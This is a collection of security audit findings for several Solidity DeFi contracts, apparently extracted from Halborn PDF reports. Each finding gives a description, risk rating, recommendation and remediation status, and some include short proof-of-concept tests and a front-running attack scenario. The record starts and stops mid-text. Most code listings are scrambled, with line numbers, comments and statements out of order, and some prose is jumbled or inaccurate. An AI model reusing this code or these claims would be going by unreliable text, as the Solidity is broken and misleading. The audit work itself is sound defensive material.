address (0) , \" Ownable : new owner is the _setOwner ( newOwner ); If the nominated EOA account is not a valid account, it is entirely possi- ble that the owner may accidentally transfer ownership to an uncontrolled account, losing the access to all functions with the onlyOwner modifier. Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is recommended to implement a two-step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of the ownership to fully succeed. This ensures the nominated EOA account is a valid and active account. This can be easily achieved by using OpenZeppelins Ownable2Step contract instead of Ownable: 53 Listing 28: Ownable2Step.sol (Lines 52-56) * * This module is used through inheritance . It will make available * @dev Contract module which provides access control mechanism , * there is an account ( an owner ) that can be granted exclusive * specific functions . * * By default , the owner account will be the one that deploys the * can later be changed with { transferOwnership } and { 1 // SPDX - License - Identifier : MIT 2 // OpenZeppelin Contracts ( last updated v4 .8.0) ( access /  Ownable2Step . sol ) 3 4 pragma solidity ^0.8.0; 5 6 import \" ./ Ownable . sol \" ; 7 8 /* * 9  where 10  access to 11 12 13  contract . This 14  acceptOwnership }. 15 16  all functions 17 18 19 abstract contract Ownable2Step is Ownable { 20 21 22  address indexed newOwner ); 23 24 25 26 27  { 28 29 30 31 32  account . Replaces the pending transfer if there is one . * Can only be called by the current owner . 33 */ 34 * @dev Returns the address of the pending owner . */ * from parent ( Ownable ). */ address private _pendingOwner ; return _pendingOwner ; /* * /* * } event OwnershipTransferStarted ( address indexed previousOwner , function pendingOwner () public view virtual returns ( address ) * @dev Starts the ownership transfer of the contract to a new 54 function transferOwnership ( address newOwner ) public virtual _pendingOwner = newOwner ; emit OwnershipTransferStarted ( owner () , newOwner ); * @dev Transfers ownership of the contract to a new account * Internal function without access restriction . */ function _transferOwnership ( address newOwner ) internal virtual } /* * 35  override onlyOwner { 36 37 38 39 40 41  ( ` newOwner `) and deletes any pending owner . 42 43 44  override { 45 46 47 48 49 50 51 52 53 54  not the new owner \"); 55 56 57 } delete _pendingOwner ; super . _transferOwnership ( newOwner ); _transferOwnership ( sender ); /* * } } * @dev The new owner accepts the ownership transfer . */ function acceptOwnership () external { address sender = _msgSender () ; require ( pendingOwner () == sender , \" Ownable2Step : caller is Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. 55 3.10 (HAL-10) LACK OF DISABLEINITIALIZERS CALL TO PREVENT UNINITIALIZED CONTRACTS - LOW ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: Informational"]}, {"title": "DONATE CALL BEFORE DEPOSIT LEADS LOSS OF POSSIBLE REWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "If the totalSupply() is zero for the Alluvial, the donate() function will not mint any rewards. The documentation explains the use of donate function as below: Allows anyone to add ethers to river without minting new shares However, if the totalSupply() exceeds zero, the contract tries to mint rewards for operators according to the _onEarnings function. Therefore, the proposition above can be ignored for this case, since the donate function calls _onDonation and _onEarnings functions in order. The sharesToMint variable will always return zero if the contract does not have any LsETH. There should be a sanity check on the contract to prevent the donating operation while totalSupply() is zero. For example: Scenario-1: Bob donates 10 ETH while totalSupply is zero. The contract mints 0 River as reward. Scenario-2: Bob donates 10 ETH while totalSupply is 1e18. The contract transfers 47619047619047619 River to operators as reward. 15 PoC - Foundry Test Case: Listing 1: testDonateBeforeDeposit 1 function testDonateBeforeDeposit () public { 2 3 4 5 vm . prank ( admin ); river . setGlobalFee (5000) ; vm . startPrank ( bob ); river . donate { value : 10 ether }() ; // returns 0 Listing 2: testDonateAfterDeposit 1 function testDonateAfterDeposit () public { 2 3 4 5 6  47619047619047619 vm . prank ( admin ); river . setGlobalFee (5000) ; vm . startPrank ( bob ); river . deposit { value : 1 ether }() ; river . donate { value : 10 ether }() ; // returns Code Location: Listing 3: River.1.sol (Lines 194,201) 192 function _onEarnings ( uint256 _amount ) internal override { 193 194 uint256 globalFee = GlobalFee . get () ; uint256 sharesToMint = ( _amount * _totalSupply () * globalFee )  / 195 196 197 (( _assetBalance () * BASE ) - ( _amount * globalFee )) ; uint256 operatorRewards = ( sharesToMint * OperatorRewardsShare  . get () ) / BASE ; 198 199 200 201 uint256 mintedRewards = _rewardOperators ( operatorRewards ); _mintRawShares ( TreasuryAddress . get () , sharesToMint -  mintedRewards ); 202 } 16 Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to add a sanity check for _onEarnings function to prevent donating if the totalSupply is zero. Remediation Plan: SOLVED: This issue was solved by adding another control to the contract. Commit ID: 6a46a1b47edaa6bc90f6c269011be835dec5c341 17 ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: High"]}, {"title": "ORACLE SHOULD CHECK UNDERLYING BALANCE INSTEAD OF TOTAL SUPPLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "The reportBeacon function reports the beacon data to the protocol to correctly validate price of underlying asset. This function also makes an internal call to the _pushToRiver function. The contract tries to calculate the ETH balance after and before during the _pushToRiver call. However, it uses totalSupply instead of the current balance, which is the underlying balance. Using total supply instead of underlying balance will lead to confusion about asset prices. The price of the asset may differ negatively, as the oracle will send less or more than the expected price. Code Location: Listing 4: Oracle.1.sol (Lines 492,494) uint256 _epochId , uint128 _balanceSum , uint32 _validatorCount , BeaconSpec . BeaconSpecStruct memory _beaconSpec 483 function _pushToRiver ( 484 485 486 487 488 ) internal { 489 490 491 _clearReporting ( _epochId + _beaconSpec . epochsPerFrame ); IRiverOracleInput riverAddress = IRiverOracleInput (  RiverAddress . get () ); 492 493 uint256 prevTotalEth = riverAddress . totalSupply () ; riverAddress . setBeaconData ( _validatorCount , _balanceSum ,  bytes32 ( _epochId )); 494 495 496 uint256 postTotalEth = riverAddress . totalSupply () ; uint256 timeElapsed = ( _epochId - LastEpochId . get () ) *  _beaconSpec . slotsPerEpoch * _beaconSpec . secondsPerSlot ; 18 497 498 499 500 501 _sanityChecks ( postTotalEth , prevTotalEth , timeElapsed ); LastEpochId . set ( _epochId ); emit PostTotalShares ( postTotalEth , prevTotalEth , timeElapsed ,  riverAddress . totalShares () ); 502 } Risk Level: Likelihood - 3 Impact - 4 Recommendation: Use the totalUnderlyingSupply() function for the total ETH calculation in the _pushToRiver function instead of the totalSupply() function. Remediation Plan: SOLVED: This issue was solved in the following commit: Commit ID: 4b4ef76c93e215ceb1218d68f73a833c766fa134 19 ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: Medium"]}, {"title": "DIVISION BY ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "During the audit, it was determined that there is a Division by Zero result in the _onEarnings function. In Solidity, when you try to set any value to zero, the execution will be reverted with an error message. Therefore, the transaction will also be reverted. The sharesToMint variable tries to divide (_amount * _totalSupply()* globalFee) to ((_assetBalance()* BASE)- (_amount * globalFee)). If (_assetBalance()* BASE) equals _amount * globalFee, the denominator will be zero. As a result, division by zero will occur. Code Location: Listing 5: River.1.sol (Lines 194,195) 192 function _onEarnings ( uint256 _amount ) internal override { 193 194 uint256 globalFee = GlobalFee . get () ; uint256 sharesToMint = ( _amount * _totalSupply () * globalFee )  / 195 196 197 (( _assetBalance () * BASE ) - ( _amount * globalFee )) ; uint256 operatorRewards = ( sharesToMint * OperatorRewardsShare  . get () ) / BASE ; 198 199 200 201 uint256 mintedRewards = _rewardOperators ( operatorRewards ); _mintRawShares ( TreasuryAddress . get () , sharesToMint -  mintedRewards ); 202 } 20 Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is suggested to add a check to verify if (_assetBalance()* BASE) has the same value as (_amount * globalFee). In this case, the result should return zero. Remediation Plan: SOLVED: This issue was solved by adding another denominator check to the contract. Commit ID: 799c72d45441d6a3a0828a381149a96611ea656e 21 ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: Medium"]}, {"title": "MALICIOUS OWNER CAN ADD AN OPERATOR WITH SAME ADDRESS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "It is possible to add the same operator to the contract using a different In this case, the contract will have two identical operators. name. During the donate event, the contract sends rewards to these operators. If the number of identical operators increases, other operators will get fewer rewards. For example,  The contract has 2 Operators: Operator-1 and Operator-2.  _rewardOperators sends 100 RIVER in total to both operators.  Operator-1 gets 50 RIVER and Operator-2 gets 50 RIVER.  The malicious owner adds another operator to the contract that has the same address as Operator-2.  _rewardOperators sends 100 RIVER again.  rewardsPerActiveValidator returns 33 since there are three operators in the contract.  Operator-1 gets 33 RIVER and Operator-2 gets 66 RIVER since the new operator has the same address as Operator-2. 22 Code Location: Listing 6: OperatorsManager.1.sol (Lines 103-106) 99 function addOperator ( if ( Operators . exists ( _name ) == true ) { revert OperatorAlreadyExists ( _name ); string calldata _name , address _operator , address _feeRecipient } 100 101 102 103 ) external onlyAdmin { 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 }) ; active : true , operator : _operator , feeRecipient : _feeRecipient , name : _name , limit : 0, funded : 0, keys : 0, stopped : 0 Operators . Operator memory newOperator = Operators . Operator ({ uint256 operatorIndex = Operators . set ( _name , newOperator ); emit AddedOperator ( operatorIndex , newOperator . name ,  newOperator . operator , newOperator . feeRecipient ); 122 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: The sanity check in the addOperator function only checks that if the operator name already exists in the contract. This function should also check if the operator address already exists. 23 Remediation Plan: SOLVED: It is now not possible to add an existing operator to the contract. The issue was solved in the following commit: Commit ID: 398ddd6363f93563fa076d52026bb45d06d1a485 24 ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: Medium"]}, {"title": "SINGLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "Single-step ownership change for contracts is risky. Owner addresses in River contracts can be changed in one step due to pattern in LibOwnable. If the owners address is set to the wrong address, this could lead to funds being lost or locked. When changing privileged roles, a two-step approach is recommended: 1. The current privileged role proposes a new address for change 2. The proposed new address then claims the privileged role in a separate transaction. Code Location: Listing 7: River.1.sol 113 function setAdministrator ( address _newAdmin ) external onlyAdmin { 114 115 } LibOwnable . _setAdmin ( _newAdmin ); Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended that you implement a two-step ownership change instead of a one-step ownership change. 25 Remediation Plan: SOLVED: This issue was solved by implementing the two-step ownership change in the contract. Commit ID: 2c3fdc8d2fa91c045d4d7332d81ee044b7e8f3da 26 ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: Medium"]}, {"title": "ACCIDENTALLY SENT ETHERS WILL GET STUCK IN PROTOCOL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "Allowed users can deposit or donate ETH to the River contract. If these users accidentally send ETH to this contract, there is no way to revert this error. Rivers contract has no withdraw function. Therefore, users will not be able to retrieve their accidentally sent ETH. Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to have a withdraw feature in the contract for these types of cases. Remediation Plan: RISK ACCEPTED: The risk of this finding was accepted. Currently, this is intended behavior. The withdrawal process will be defined and implemented in details once the spec is written in stone. As we advance with unknowns, we currently have a stub withdrawal con- tract ready to accept all the exited funds, where the implementation will be changed to manage all this process. 27 ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: Low"]}, {"title": "MISSING REENTRANCY GUARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Code Location: Listing 8: WLSETH.1.sol (Line 124) 124 function mint ( address _recipient , uint256 _value ) external { 125 126 BalanceOf . set ( _recipient , BalanceOf . get ( _recipient ) + _value ); IRiverToken ( RiverAddress . get () ). transferFrom ( msg . sender ,  address ( this ) , _value ); 127 } Listing 9: WLSETH.1.sol (Line 134) 134 function burn ( address _recipient , uint256 _value ) external { 135 uint256 callerUnderlyingBalance = IRiverToken ( RiverAddress . get  () ). underlyingBalanceFromShares ( 136 137 138 139 140 141 BalanceOf . get ( msg . sender ) ); if ( _value > callerUnderlyingBalance ) { revert BalanceTooLow () ; } uint256 sharesAmount = IRiverToken ( RiverAddress . get () ).  sharesFromUnderlyingBalance ( _value ); 142 BalanceOf . set ( msg . sender , BalanceOf . get ( msg . sender ) -  sharesAmount ); 143 IRiverToken ( RiverAddress . get () ). transfer ( _recipient ,  sharesAmount ); 144 } 28 Listing 10: TransferManager.1.sol (Line 49) 49 function deposit () external payable { 50 51 } _deposit ( msg . sender ); Listing 11: TransferManager.1.sol (Line 61) } if ( msg . value == 0) { revert EmptyDonation () ; 61 function donate () external payable { 62 63 64 65 66 67 68 69 } _onDonation ( msg . value ); emit Donation ( msg . sender , msg . value ); Risk Level: Likelihood - 3 Impact - 2 Recommendation: The functions in the code location section are missing nonReentrant It is recommended to add the OpenZeppelin ReentrancyGuard modifiers. library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. 29 Remediation Plan: SOLVED: This finding was solved for the burn() and mint() methods after implementing nonReentrant modifier for these methods. Commit ID: e9be5d57d67568b6e47ee0748945a4884c939a4d 30 ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: Low"]}, {"title": "IGNORED RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "The transferFrom and transfer functions are declared to return a boolean return variable after successful transfers. However, it does not return any variables during calls to the WLSETH.mint() and WLSETH.burn() func- tions. It is important to validate these return variables. In this case, calling these functions can break any integrations or composability. Code Location: Listing 12: WLSETH.1.sol (Line 126) 124 function mint ( address _recipient , uint256 _value ) external { 125 126 BalanceOf . set ( _recipient , BalanceOf . get ( _recipient ) + _value ); IRiverToken ( RiverAddress . get () ). transferFrom ( msg . sender ,  address ( this ) , _value ); 127 } Listing 13: WLSETH.1.sol (Line 143) 134 function burn ( address _recipient , uint256 _value ) external { 135 uint256 callerUnderlyingBalance = IRiverToken ( RiverAddress . get  () ). underlyingBalanceFromShares ( 136 137 138 139 140 141 BalanceOf . get ( msg . sender ) ); if ( _value > callerUnderlyingBalance ) { revert BalanceTooLow () ; } uint256 sharesAmount = IRiverToken ( RiverAddress . get () ).  sharesFromUnderlyingBalance ( _value ); 142 BalanceOf . set ( msg . sender , BalanceOf . get ( msg . sender ) -  sharesAmount ); 143 IRiverToken ( RiverAddress . get () ). transfer ( _recipient ,  sharesAmount ); 144 } 31 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is not recommended to ignore these return variables. These boolean values should be returned during the function calls. Remediation Plan: SOLVED: This vulnerability was resolved by Alluvial team after adding additional code that checks the return value from transferFrom() method. Commit ID: cab51608d19a44e0c165715bc6e7a970d657b19a 32 ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: Low"]}, {"title": "LACK OF ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf", "body": "River Contracts have address fields in multiple functions. These func- tions are missing address validations. Each address should be validated and checked to be non-zero. This is also considered a best practice. During testing, it has been found that some of these inputs are not protected against using address(0) as the destination address. Code Location: Listing 14: Functions with missing zero address checks 1 OracleManagerV1 . initOracleManagerV1 :: _oracle 2 OperatorsManagerV1 . addOperator :: _operator , _feeRecipient 3 DepositManagerV1 . initDepositManagerV1 :: _depositContractAddress 4 WLSETHV1 . mint :: _recipient 5 WLSETHV1 . burn :: _recipient 6 RiverV1 . setAdministrator :: _newAdmin 7 RiverV1 . setTreasury :: _newTreasury 8 RiverV1 . setAllowlist :: _newAllowlist 9 Firewall . constructor :: governor_ , executor_ 10 Firewall . changeGovernor :: newGovernor 11 Firewall . changeExecutor :: newExecutor 12 ELFeeRecipientV1 . initELFeeRecipientV1 :: _riverAddress Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to validate that each address input is non-zero. 33 Remediation Plan: SOLVED: The issue was solved by adding zero address checks. Commit ID: 4a526b0a9f82537bdf582fee1475171433149216 34 3.10 (HAL-10) USE OF UNNECESSARY IFADMIN MODIFIER - LOW ", "labels": ["Halborn", "Alluvial_Liquid_Collective", "Severity: Informational"]}, {"title": "BRIDGENFT CALL CAN BE FRONTRUN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the NFTMintingBridge contract, the function bridgeNft() is used to bridge ERC721 tokens from one chain to another: Listing 1: NFTMintingBridge.sol (Line 89) */ external payable whenNotPaused require ( msg . value != 0 , \" ! fee \" ); // Make sure a native fee is The ** LayerZero ** destination chain ID . The tokenId of the NFT * bridgeNft * @param dstChainId * @param tokenId * * Burns the NFT with ID < tokenID >. A cross - chain message is then 74 /* * 75 76 77 78 79  sent to our counterpart on the destination chain to mint / release  this NFT . 80 81 function bridgeNft ( uint16 dstChainId , uint256 tokenId ) 82 83 84 85 { 86  supplied for the cross - chain message . 87 88  approved by the token owner nft . burn ( tokenId ); 89 90 91  tokenId ); 92 93 94 95 96 97  refund any extra gas back to caller 98 99 dstChainId , // destination chainId payloadBytes , // abi . encode () 'ed bytes payable ( msg . sender ) , // refund address ( LayerZero will // send LayerZero message _lzSend ( bytes memory payloadBytes = _buildReleaseMesssage ( msg . sender , address (0 x0 ) , // unused bytes ( \" \") , // unused // Burn the NFT - This will only work if the bridge was 14 100 101 102 103 104 } msg . value // native fee amount ); emit NftBurnReceived ( dstChainId , msg . sender , tokenId ); The function burns the tokenId passed as parameter, but it does not check that the caller of the function actually owns that NFT. This opens up the following attack vector: Bob is a malicious user who is monitoring the mempool for any 1. Alice owns NFT #1337. 2. Alice approves the NFTMintingBridge so then she can call bridgeNft() to bridge the NFT to a different chain. 3. Alice calls NFTMintingBridge.bridgeNft(2, 1337). 4. NFTMintingBridge.bridgeNft() calls. 5. paying a higher gas fee. NFTMintingBridge.bridgeNft(2, 1337). 6. reverts as the token was already burnt by Bob. 7. Bob gets the NFT minted in the new chain. Bob detects Alices call and front-runs her transaction by Bobs transaction is identical to Alices, Bobs transaction is mined before Alices. Alices transaction Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to add the following require check in the bridgeNft() function: Listing 2: NFTMintingBridge.sol (Line 87) 74 /* * 75 * bridgeNft 15 */ external payable whenNotPaused require ( msg . value != 0 , \" ! fee \" ); // Make sure a native fee is The ** LayerZero ** destination chain ID . The tokenId of the NFT require ( nft . ownerOf ( tokenId ) == msg . sender , \"! owner \" ); // Burn the NFT - This will only work if the bridge was * @param dstChainId * @param tokenId * * Burns the NFT with ID < tokenID >. A cross - chain message is then 76 77 78 79  sent to our counterpart on the destination chain to mint / release  this NFT . 80 81 function bridgeNft ( uint16 dstChainId , uint256 tokenId ) 82 83 84 85 { 86  supplied for the cross - chain message . 87 88  approved by the token owner 89 nft . burn ( tokenId ); 90 91  tokenId ); 92 93 94 95 96 97  refund any extra gas back to caller 98 99 100 101 102 103 104 } dstChainId , // destination chainId payloadBytes , // abi . encode () 'ed bytes payable ( msg . sender ) , // refund address ( LayerZero will address (0 x0 ) , // unused bytes ( \" \") , // unused msg . value // native fee amount // send LayerZero message _lzSend ( bytes memory payloadBytes = _buildReleaseMesssage ( msg . sender , emit NftBurnReceived ( dstChainId , msg . sender , tokenId ); ); Remediation Plan: SOLVED: The Gains Trade team solved the issue in the Commit ID: a349e7438543d57b5845a6771d4e642a1a4868f4 16 Listing 3: NFTMintingBridge.sol (Line 89) */ external payable whenNotPaused The ** LayerZero ** destination chain ID . The tokenId of the NFT * bridgeNft * @param dstChainId * @param tokenId * * Burns the NFT with ID < tokenID >. A cross - chain message is then 76 /* * 77 78 79 80 81  sent to our counterpart on the destination chain to mint / release  this NFT . 82 83 function bridgeNft ( uint16 dstChainId , uint256 tokenId ) 84 85 86 87 { 88  supplied for the cross - chain message . 89 90 91  approved by the token owner nft . burn ( tokenId ); 92 93 94  tokenId ); 95 96 97 98 99 100 dstChainId , // destination chainId payloadBytes , // abi . encode () 'ed bytes payable ( msg . sender ) , // refund address ( LayerZero will // send LayerZero message _lzSend ( require ( msg . value != 0 , \" ! fee \" ); // Make sure a native fee is bytes memory payloadBytes = _buildReleaseMesssage ( msg . sender , // Burn the NFT - This will only work if the bridge was require ( nft . ownerOf ( tokenId ) == msg . sender , \" ! owner \" );  refund any extra gas back to caller 101 102 103 104 105 106 107 } address (0 x0 ) , // unused bytes ( \" \") , // unused msg . value // native fee amount ); emit NftBurnReceived ( dstChainId , msg . sender , tokenId ); 17 ", "labels": ["Halborn", "Gains_Trade", "Severity: Critical"]}, {"title": "WRONG FEE SENT TO CHAINLINK NODES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the GTokenOpenPnlFeed contract, the makeOpenPnlRequest() function is used to send requests to a pool of Chainlink oracles: Listing 4: GTokenOpenPnlFeed.sol (Lines 251-254) Chainlink . Request memory linkRequest = buildChainlinkRequest ( uint linkFeePerNode = IERC20 ( chainlinkTokenAddress () ) requests [++ lastRequestId ] = Request ({ ); job , address ( this ) , this . fulfill . selector . balanceOf ( address ( this )) / LINK_FEE_BALANCE_DIVIDER / oracles . length ; 243 // Create requests 244 function makeOpenPnlRequest () private { 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 initiated : true , active : true , linkFeePerNode : linkFeePerNode emit NextEpochValueRequested ( gToken . currentEpoch () , oracles [ i], linkRequest , linkFeePerNode )] = lastRequestId ; }) ; } for ( uint i ; i < oracles . length ; i ++) { requestIds [ sendChainlinkRequestTo ( nextEpochValuesRequestCount ++; nextEpochValuesLastRequest = block . timestamp ; 18 lastRequestId , job , oracles . length , linkFeePerNode 275 276 277 278 279 280 } ); The linkFeePerNode variable is wrongly calculated, as it depends on the contracts balance. If the Link balance of the GTokenOpenPnlFeed contract is too high, more Link than needed would be sent to the Chainlink oracles as fees. In case that the Link balance of the GTokenOpenPnlFeed contract is not high enough, the contract will not send enough Link to the Chainlink oracles and the transactions will revert. Risk Level: Likelihood - 5 Impact - 1 Recommendation: It is recommended to set a fixed Link fee based on the blockchain and the type of Chainlink oracle used. This Link fee is usually 0.1 Link: 19 Remediation Plan: RISK ACCEPTED: The Gains Trade team accepted the risk and stated: We will send enough to the contract so that divided by 1000 it represents the amount we want, and then we will refill it every few months. This pattern allows everyone to send a link to the contract in a decentralized manner. It also means the transaction can never revert, unlike what the issue says because it can never run out of LINK. 20 ", "labels": ["Halborn", "Gains_Trade", "Severity: Medium"]}, {"title": "THE TRANSFEROWNERSHIP PATTERN IS NOT FOLLOWED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The current ownership transfer process for the GToken contract inheriting from Ownable involves the current owner/timelock contract, calling the transferOwnership function. If the nominated account is not a valid account, it is entirely possible that the owner may accidentally transfer ownership to an uncontrolled account, losing the access to all functions with the onlyOwner modifier. Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to implement a two-step process where the owner/timelock contract nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of the ownership to fully succeed. This ensures the nominated account is valid and active. Remediation Plan: RISK ACCEPTED: The Gains Trade team accepted the risk of this finding. 21 ", "labels": ["Halborn", "Gains_Trade", "Severity: Informational"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Contracts in-scope are missing address validation in some functions. It is possible to configure the zero address, which may cause issues during the contract execution. Code Location: The following function is not validating, that the given addresses in the newValues array are different from zero: Listing 5: GTokenOpenPnlFeed.sol 173 function updateOracles ( address [] memory newValues ) external  onlyOwner { 174  ; 175 176 177 178 } require ( newValues . length >= minAnswers , \" ARRAY_TOO_SMALL \" ) oracles = newValues ; emit OraclesUpdated ( newValues ); The constructor is not validating that the address of the _token argument is different from zero: Listing 6: TWAPPriceGetter.sol constructor ( IUniswapV3Pool _pool , address _token , uint32 require ( address ( _pool ) != address (0) && _twapInterval > 0 16  _twapInterval , uint _precision ){ 17  && _precision > 0, \" WRONG_TWAP_CONSTRUCTOR \" ); 18 19 20 21 22 pool = _pool ; twapInterval = _twapInterval ; precision = _precision ; 22 23 24 } isGnsToken0InLp = pool . token0 () == _token ; Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider adding a check to see if the address is different from the zero address. Remediation Plan: RISK ACCEPTED: The Gains Trade team accepted the risk of this finding. 23 ", "labels": ["Halborn", "Gains_Trade", "Severity: Low"]}, {"title": "GAS OVER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In all the loops, the counter variable is incremented using i++. loops, using ++i costs less gas per iteration than i++. In Code Location: GTokenOpenPnlFeed.sol - Line 197: for(uint i = 0; i < reqToResetCount; i++) - Line 248: for(uint i = 0; i < oracles.length; i ++) - Line 368: for(uint i = 0; i < array.length; i++) Proof of Concept: For example, based in the following test contract: Listing 7: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } The difference in the gas costs: 24 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use pre-incrementation instead of post-incrementation to update the value of an uint variable inside a loop to save some gas. This is not applicable outside of loops. Remediation Plan: ACKNOWLEDGED: The Gains Trade team acknowledged this finding. 25 ", "labels": ["Halborn", "Gains_Trade", "Severity: Informational"]}, {"title": "REDUNDANT INITIALIZATION OF UINT VARIABLES TO 0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "As the variable is a uint, it is already initialized to 0. For example, uint256 i = 0 reassigns the 0 to i, which wastes gas. Code Location: GTokenOpenPnlFeed.sol - Line 197: for(uint i = 0; i < reqToResetCount; i++) - Line 248: for(uint i = 0; i < oracles.length; i ++ - Line 368: for(uint i = 0; i < array.length; i++) Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not initialize uint variables to 0 to save some gas. For example, use instead: for (uint i; i < nodes.length; ++i). Remediation Plan: SOLVED: The Gains Trade team solved the issue by reducing the gas costs in the Commit ID: f1bcbb4da9efdd8a8be2d28a297cfc9b999d2e1a 26 ", "labels": ["Halborn", "Gains_Trade", "Severity: Informational"]}, {"title": "USE OF REVERT STRINGS INSTEAD OF CUSTOM ERRORS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Failed operations in the smart contracts in scope are reverted with accompanying messages selected from a set of hard-coded strings. In the EVM, emitting a hard-coded string in an error message costs ~50 more gas than emitting a custom error. Additionally, hard-coded strings increase the gas required to deploy the contract. Code Location: GToken.sol - Line 182: require(_contractAddresses.asset != address(0)... - Line 231: require(_msgSender()== manager, \"ONLY_MANAGER\"); - Line 236: require(shareToAssetsPrice > 0, \"PRICE_0\"); - Line 237: require(assetsOrShares > 0, \"VALUE_0\"); - Line 242: require(maxDiscountP > 0, \"NO_ACTIVE_DISCOUNT\"); - Line 243: require(lockDuration >= MIN_LOCK_DURATION, \"BELOW_MIN_LOCK_DURATION\"); - Line 244: require(lockDuration <= MAX_LOCK_DURATION, \"ABOVE_MAX_LOCK_DURATION\"); - Line 250: require(newOwner != address(0), \"Ownable: new owner is the zero address \"); - Line 251: require(newOwner != manager && newOwner != admin, \"WRONG_VALUE\"); 27 - Line 256: require(newValue != address(0), \"ADDRESS_0\"); - Line 257: require(newValue != owner()&& newValue != admin, \"WRONG_VALUE\"); - Line 263: require(newValue != address(0), \"ADDRESS_0\"); - Line 264: require(newValue != owner()&& newValue != manager, \"WRONG_VALUE\"); - Line 270: require(newValue != address(0), \"ADDRESS_0\"); - Line 276: require(newValue.addr != address(0), \"ADDRESS_0\"); - Line 277: require(newValue.signature.length > 0, \"BYTES_0\"); - Line 283: require(newValue != address(0), \"ADDRESS_0\"); - Line 295: require(newValue >= 